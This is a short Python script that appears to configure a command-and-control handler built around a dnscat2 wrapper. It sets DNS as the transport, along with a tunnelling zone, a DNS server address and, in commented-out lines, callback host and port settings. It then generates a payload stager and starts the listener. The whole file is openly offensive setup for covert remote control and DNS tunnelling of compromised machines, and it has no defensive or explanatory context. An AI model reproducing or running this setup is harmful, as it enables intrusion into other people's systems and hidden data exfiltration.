#!/usr/bin/python3

from handler.handler import Handler

#import os.path
#installPath = os.path.abspath(os.path.dirname(__file__))
#print_debug("Main", "installPath = {}".format(installPath))

handler = Handler()

handler.setoption("PLATFORM", "DNSCAT2WRAPPER")
#handler.setoption("LHOST", "127.0.0.1")
#handler.setoption("LPORT", "0")
handler.setoption("TRANSPORT", "DNS")
handler.setoption("ZONE", "zfs.sy.gs")
handler.setoption("DNSSERVER", "10.201.1.83")
#handler.setoption("LPORT", "5000")
#handler.setoption("BLUB", "TEST")

#handler.setoption("STAGEENCODING", "FALSE")
#handler.setoption("STAGEAUTHENTICATION", "FALSE")
#handler.setoption("LHOST", "10.201.1.83")

handler.generatestager()

handler.run()

